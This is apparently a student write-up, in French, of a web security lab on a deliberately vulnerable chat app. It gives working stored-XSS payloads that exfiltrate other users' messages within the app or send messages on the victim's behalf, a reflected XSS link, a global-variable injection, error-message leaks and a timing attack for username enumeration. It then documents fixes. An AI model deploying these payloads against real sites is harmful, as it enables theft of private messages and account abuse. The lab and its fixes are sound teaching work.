# 7 Security

Énoncé [ici](https://web-classroom.github.io/labos/labo-7-security.html)

## Partie 1

Compte utilisé: `loic.herman1`

### Flag 1

**Flag**: flag1:dacbc9136bd6064c

**Exploit**

Le premier flag se trouve dans le dernier message envoyé par Trump à Musk. Pour l'obtenir, notre JS doit extraire du DOM le contenu du dernier message de la conversation avec Trump, et l'envoyer à travers la conversation que Elon a avec nous.

```html
<img
  src="x"
  onerror="
if (document.querySelector('#header .name').innerText !== 'TestStudent1') {
    let t = Array(...document.querySelectorAll('.conversation .last-message')).map(c => c.innerHTML.trim()).join('|||');
    console.log(t)
    document.getElementById('message').innerHTML = t;
    document.getElementById('messageButton').click()
}
"
/>
```

### Flag 2

**Flag**: flag2:acc90b31e88f9b7f

**Exploit**:

An image is sent with an onerror event trigger that will collect the information from the page and send it to us directly.

```html
<img
  src="random"
  onerror="if (document.querySelector('#header .name').innerText !== 'Herman Loïc') {
    let t = Array(...document.querySelectorAll('.conversation .last-message')).map(c => c.innerHTML.trim()).join('|||');
    console.log(t)
    document.getElementById('message').innerHTML = t;
    document.getElementById('messageButton').click()
}"
/>
```

### Flag 3

**Flag**: N/A

**Exploit**

Le flag 3 est envoyé par Trump quand Elon lui envoie un message donné dans l'énoncé. On fait donc, similairement au flag 2, faire un appel à l'API d'envoi de message, pour envoyer un message à Trump avec le contenu demandé.

```html
<img
  src="x"
  onerror="
  let t = Array(...document.querySelectorAll('.conversation')).map(c => {
    let name = c.querySelector('.name').innerHTML
    if (name.includes('Donald')) {
      let url = c.onclick
      url = url.toString()
      url = url.match(/openChat\(\'(.*)\'\)/)[1]
      console.log(url)

      fetch('/conversation/'+url, {
        method: 'POST',
        body: new URLSearchParams({ message: 'gimme the rest of the codes pls' })
      })
    }
  })
"
/>
```

Le dernier flag se trouvera maintenant dans la conversation entre Elon et Trump ; on peut donc réutiliser le code du flag 2 pour l'obtenir.

## Partie 2

Compte utilisé: `loic.herman1`

### Flag 4

**Flag**: flag4:bf61e7b57fa30fe0

**Exploit**

Deux choses sont à remarquer :

- La fonctionnalité qui log-out après 10 minutes a été implémentée dans une balise `<script>`, et contient une erreur, mais le developpeur ne s'en est pas rendu compte car elle a été catch par le try-catch. En effet, `nextTimeout` est une variable globale qui n'est pas définie initialement.
- Dans la liste des conversations, le display name de l'utilisateur est utilisé comme attribut `id` de la balise `<span>` affichant le nom de l'utilisateur.

On a donc une vulnérabilité de variable injection : en changeant son nom d'utilisateur à `nextTimeout`, on injecte l'existence de la variable globale `nextTimeout` chez Elon, qui aura pour effet de le faire se déconnecter immédiatement (car `nextTimeout` est utilisé dans le calcul de `secondsLeft`, et que s'il n'est pas un nombre, `secondsLeft` sera `NaN` et donc inférieur à 0).

### Flag 5

**Flag**: N/A

**Exploit**

Ce flag utilise du leak d'information dans les messages d'erreur. À l'envoi d'un message vide, le serveur retourne une erreur 403 avec un message d'erreur. Ce dernier leak les ids des conversations du destinataire. En envoyant un message vide à Elon, on peut donc récupérer l'id de sa conversation avec Zuckerberg.

Ensuite, lorsqu'on tente d'accéder à l'url d'une conversation à laquelle on n'appartient pas, un 403 est à nouveau retourné. Le message d'erreur associé leak l'intégralité de la conversation. On peut donc ainsi récupérer le flag se trouvant dans la conversation entre Elon et Zuckerberg.

### Flag 6

Personnes inscrites à ChatsApp: N/A

**Exploit**

Flag 6 est une timing attack. En effet, le serveur tente d'implémenter une protection contre le brute force en ralentissant la réponse en cas d'erreur. Cependant, une erreur de développement fait que le cooldown n'a lieu que si l'utilisateur existe. On peut donc essayer le username de chaque utilisateur avec un mot de passe quelconque, et voir si le serveur prend plus de temps à répondre. Si c'est le cas, alors l'utilisateur existe.

## Exploit Supplémentaire

Lien vers ChatsApp qui, lorsque l'on clique dessus, exécute `alert(document.cookie)` dans le browser, que l'on soit actuellement connecté ou non à ChatsApp :

`/login?error=<script>alert(document.cookie)<%2Fscript>`

## Correction des vulnérabilités

Si vous effectuez d'autres modifications que celles demandées, merci de les lister ici :

### Flags 1, 2, 3

Ces flags étant des vulnérabilités XSS, il est important d'éviter toute possibilité d'envoyer un message contenant du code HTML ou JavaScript.
Il y a plusieurs options possibles, nous avons décidé d'utiliser la plus forte: toutes les balises HTML seront supprimées des messages envoyés, on gardera alors que le contenu textuel du message.

En sécurité, il est très recommandé de s'appuyer sur des librairies correctement maintenues pour effectuer ce genre de tâches. Nous utilisons donc `sanitize-html` avec les options suivantes:

```js
let message = sanitize(req.body.message, {
  allowedTags: [],
  allowedAttributes: {},
});
```

Cette modification est faite dans le backend lors de l'envoi de message pour s'assurer de ne pas avoir des données problématiques dans la base de données qui augmenterait considérablement la surface d'attaque.

### Flag 4

Nous ajoutons la déclaration de la variable `nextTimeout` dans le script de déconnexion après 10 minutes.

```js
let nextTimeout = null;
```

Pour aussi éviter tout autre risque d'injection de variable globale, l'attribut `id` des balises `<span>` affichant le nom de l'utilisateur a été retiré.
Ce n'était de toute façon pas nécessaire, et cela évite une vulnérabilité potentielle dans le cas où l'utilisateur pouvait avoir un nom contenant du HTML ou autre.

A ce propos nous avons ajouté une validation d'entrée sur le username pour éviter les injections de code HTML ou JavaScript.

```js
let displayName = req.body.displayName;
if (!displayName || !displayName.match(/^[a-zA-Z0-9_-\s]+$/)) {
  res.status(400).send("Invalid display name provided");
  return;
}
```

### Flag 5

Pour éviter tout problème, nous avons enlevé complètement la notion de détails d'erreurs.
Nous retournons simplement une `ServerError` avec un message générique.

Ici il est important de différencier les messages d'erreurs de validations où le message est utile pour l'utilisateur sans divulguer la présence d'un utilisateur ou d'une conversation de ceux d'erreurs système où le message ne doit pas contenir d'informations sensibles.

Donc, pour l'erreur d'utilisateur absent dans la conversation et l'erreur de conversation inconnue, nous retournons le même message d'erreur générique.
Par contre si le message de l'utilisateur est vide, nous retournons un message d'erreur spécifique.

```js
export function userNotInConversationError() {
  return new ServerError("Operation not permitted", "Conversation not found");
}

export function conversationNotFoundError() {
  return new ServerError("Operation not permitted", "Conversation not found");
}

export function emptyMessageError() {
  return new ServerError("Operation not permitted", "Message is empty");
}
```

### Flag 6

Le middleware d'authentication utilise une attente de 1 seconde dans le cas où un utilisateur existe mais que le mot de passe fourni n'est pas le bon.
Une correction simple serait de faire la même attente dans le cas où l'utlisateur n'existe pas en base de données.

Le mieux serait néanmoins une fois l'implémentation de `argon2` pour le hashage des mots de passe, de ne pas faire d'attente mais de calculer le hash du mot de passe fourni
dans tous les cas et de comparer le hash avec celui en base de données. Cela permettra d'avoir un temps de réponse constant et de ne pas donner d'informations sur la présence
ou non d'un utilisateur, pour autant que la base de données soit correctement indexée.

```js
await getUserByName(username).then(
  async (user) => {
    if (user.password === password) {
      // Set the cookie with session expiration
      setLoginCookie(res, username, password);
      req.user = user;
    } else {
      console.log(`User ${username} has wrong login key ${password}`);
      // Waiting 1 second to prevent bruteforce
      await new Promise((resolve) => setTimeout(resolve, 1000));
    }
  },
  async () => {
    console.log(`User ${username} not found`);
    await new Promise((resolve) => setTimeout(resolve, 1000));
  }
);
```

### Exploit supplémentaire

Le template de login utilisait une injection directe du message d'erreur donné en paramètre dans la page générée.
Pour résoudre l'erreur simplement, il suffit de changer le template pour injecter seulement la valeur textuelle du message d'erreur.

```html
<%= errorMessage %>
<!-- au lieu de <%- errorMessage %>-->
```

### Corrections pour l'ajout de `argon2`

En premier lieu, nous ajoutons argon2 pour le stockage des mots de passe sous forme hashée.
Le script d'initialisation de la base de données est modifié pour hasher les mots de passe de démonstration avant de les insérer dans la base de données.

Nous ajoutons ensuite au projet `express-session` pour gérer les sessions de l'utilisateur de manière sécurisée,
et `passport-local` pour gérer l'authentification de l'utilisateur. `dotenv` est ajouté pour permettre de charger le secret des sessions depuis un fichier `.env`.

Les modifications effectuées ensuite sont les suivantes:

1. Le stockage de session est configuré pour permettre à passport.js de l'utiliser par la suite, les données utilisateurs sont sauvegardées en mémoire et un cookie avec un identifiant de session est envoyé au client.
   Le secret des sessions est chargé depuis le fichier `.env` et est utilisé pour signer les cookies de session.
2. La stratégie de connexion `local` de passport.js est ensuite configurée, pour éviter les timings attacks une vérification de hash est faite sur un faux hash si l'utilisateur n'existe pas.
3. La configuration du stockage des utilisateurs par passport.js est faite pour utiliser la base de données.
4. Les middlewares de session et de passport.js sont ajoutés à l'application express.
5. Les routes de login et logout sont modifiées pour utiliser passport.js et express-session.
6. La gestion du login précédente est remplacée par passport.js.
7. La vérification des routes authentifiées est faite via la méthode offerte par le middleware de passport.js.
8. Le logout est modifié pour détruire la session de l'utilisateur, et gérer la redirection vers la page de login.
